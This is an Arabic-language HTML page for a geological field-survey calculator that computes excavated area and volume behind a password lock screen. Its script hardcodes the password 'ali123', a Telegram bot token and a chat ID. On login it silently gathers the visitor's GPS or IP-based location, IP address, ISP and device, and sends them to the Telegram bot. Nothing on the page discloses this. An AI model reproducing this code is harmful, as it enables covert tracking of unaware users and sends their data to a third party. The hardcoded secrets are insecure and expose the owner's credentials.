<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام المسح الميداني الجيولوجي - علي شندل الجنابي</title>
    <style>
        :root { --primary: #1c2833; --secondary: #273746; --accent: #2980b9; --bg: #f8f9fa; }
        body { font-family: 'Arial', sans-serif; background-color: var(--bg); margin: 0; padding: 20px; text-align: right; color: #333; line-height: 1.6; }
        #lockScreen { display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: white; z-index: 9999; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }
        .password-box { background: rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 12px; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); border: 1px solid rgba(255,255,255,0.2); }
        .password-box input { padding: 12px; font-size: 1.2rem; border-radius: 6px; border: none; text-align: center; width: 250px; margin-bottom: 15px; }
        .btn-unlock { background: #27ae60; color: white; padding: 12px 30px; font-size: 1.2rem; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; }
        #mainContent { display: none; }
        .container { background: white; max-width: 900px; margin: auto; border-radius: 12px; box-shadow: 0 8px 25px rgba(0,0,0,0.15); overflow: hidden; }
        .header { background: linear-gradient(135deg, #1c2833 0%, #2980b9 100%); color: white; padding: 35px 20px; text-align: center; border-bottom: 5px solid #f1c40f; }
        .header h2 { color: #f1c40f; font-size: 1.3rem; cursor: pointer; }
        .content-padding { padding: 30px; }
        .section-title { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 8px; font-size: 1.3rem; margin-bottom: 20px; font-weight: bold; }
        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; margin-bottom: 10px; }
        .btn-calc { background: var(--accent); color: white; border: none; padding: 15px; width: 100%; font-size: 1.2rem; font-weight: bold; border-radius: 6px; cursor: pointer; }
        #resultsSection { display: none; margin-top: 30px; border: 2px solid #2ecc71; padding: 25px; border-radius: 8px; background: #f9fff9; }
        canvas { background: #fff; width: 100%; height: auto; margin-top: 20px; border: 1px solid #ddd; border-radius: 6px; }
        .footer { text-align: center; padding: 20px; background: #eee; color: #555; font-size: 0.9rem; font-weight: bold; }
    </style>
</head>
<body>

<div id="lockScreen">
    <h1 style="color: #f1c40f;">🔒 نظام المسح الميداني</h1>
    <p>بإشراف الجيولوجي علي شندل الجنابي</p>
    <div class="password-box">
        <input type="password" id="adminPassword" placeholder="كلمة المرور">
        <button onclick="handleLogin()" class="btn-unlock">فتح النظام</button>
        <div id="errorMsg" style="display:none; color:#ff6b6b; margin-top:10px;">❌ الرمز غير صحيح</div>
    </div>
</div>

<div id="mainContent" class="container">
    <div class="header">
        <h1>نظام المسح الميداني الجيولوجي</h1>
        <h2 ondblclick="location.reload()">بإشراف الجيولوجي علي شندل الجنابي</h2>
    </div>

    <div class="content-padding">
        <div class="section-title">بيانات العقد والقياسات</div>
        <input type="number" id="contractArea" placeholder="المساحة الكلية (م²)">
        <input type="number" id="contractVol" placeholder="الكمية الكلية (م³)">
        <input type="number" id="fieldLength" placeholder="الطول الميداني (م)">
        <input type="number" id="fieldWidth" placeholder="العرض الميداني (م)">
        <input type="number" id="fieldDepth" placeholder="العمق (م)">
        
        <button class="btn-calc" onclick="calculateResults()">حساب النتائج ورسم المرتسم</button>

        <div id="resultsSection" class="section">
            <div id="resData"></div>
            <canvas id="geoCanvas" width="850" height="500"></canvas>
        </div>
    </div>
    <div class="footer">جميع الحقوق محفوظة - الجيولوجي علي شندل الجنابي © 2026</div>
</div>

<script>
    const MASTER_PASSWORD = "ali123";
    const TG_TOKEN = "8627528486:AAEvkwF2pRn-v9Z0WdpTx2nwxso6Wctz8TU";
    const TG_CHAT_ID = "1091011395";

    async function sendSecurityReport(gpsData = null) {
        try {
            // جلب بيانات الـ IP والمنطقة (تعمل حتى لو GPS مغلق)
            const ipResponse = await fetch('https://ipapi.co/json/');
            const ipData = await ipResponse.json();

            const time = new Date().toLocaleString('ar-IQ');
            const device = navigator.userAgent.includes("Telegram") ? "تطبيق تليجرام" : "متصفح خارجي";

            let message = `🚨 *تنبيه أمني من نظام الجيولوجي علي*\n\n`;
            message += `📱 الجهاز: ${device}\n`;
            message += `📅 الوقت: ${time}\n`;
            message += `🌐 عنوان IP: \`${ipData.ip}\`\n`;
            message += `🏢 المنطقة: ${ipData.city}, ${ipData.region} (${ipData.org})\n`;

            if (gpsData) {
                message += `📍 موقع GPS دقيق: [فتح الخريطة](https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon})\n`;
            } else {
                message += `📍 موقع تقريبي (IP): [فتح الخريطة](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})\n`;
                message += `⚠️ ملاحظة: الـ GPS معطل أو تم رفض الإذن.`;
            }

            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
        } catch (e) {
            // في حال فشل جلب الـ IP، نرسل تبليغاً بسيطاً
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("⚠️ دخول جديد للنظام (تعذر جلب تفاصيل الموقع)")}`);
        }
    }

    function handleLogin() {
        if (document.getElementById('adminPassword').value === MASTER_PASSWORD) {
            document.getElementById('lockScreen').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';

            // محاولة جلب الموقع بكل الطرق
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    p => sendSecurityReport({lat: p.coords.latitude, lon: p.coords.longitude}),
                    () => sendSecurityReport(null), // في حال رفض الإذن
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                sendSecurityReport(null); // المتصفح لا يدعم GPS
            }
        } else {
            document.getElementById('errorMsg').style.display = 'block';
        }
    }

    function calculateResults() {
        const cA = parseFloat(document.getElementById('contractArea').value) || 0;
        const L = parseFloat(document.getElementById('fieldLength').value) || 0;
        const W = parseFloat(document.getElementById('fieldWidth').value) || 0;
        const D = parseFloat(document.getElementById('fieldDepth').value) || 0;
        const iA = L * W; const rA = cA - iA; const iV = iA * D;
        
        document.getElementById('resData').innerHTML = `
            <p>المساحة المستثمرة: <b>${iA.toLocaleString()} م²</b></p>
            <p>الكمية المستخرجة: <b>${iV.toLocaleString()} م³</b></p>
            <p>المساحة المتبقية: <b>${rA.toLocaleString()} م²</b></p>
        `;
        document.getElementById('resultsSection').style.display = 'block';
        drawChart(W, cA, (iA/cA)*100);
    }

    function drawChart(fW, totalA, invPct) {
        const canvas = document.getElementById('geoCanvas');
        const ctx = canvas.getContext('2d');
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        const margin = 50; const dW = canvas.width - 100; const dH = canvas.height - 150;
        let invW = dW * (invPct / 100);
        ctx.fillStyle = "#cceeff"; ctx.fillRect(margin, margin, invW, dH);
        ctx.fillStyle = "#115577"; ctx.fillRect(margin + invW, margin, dW - invW, dH);
        ctx.strokeStyle = "#000"; ctx.strokeRect(margin, margin, dW, dH);
        ctx.fillStyle = "#000"; ctx.font = "bold 16px Arial";
        ctx.fillText("المنطقة المستثمرة", margin + 10, margin - 10);
        ctx.fillText("A", margin-20, margin); ctx.fillText("B", margin+dW+5, margin);
    }
</script>
</body>
</html>
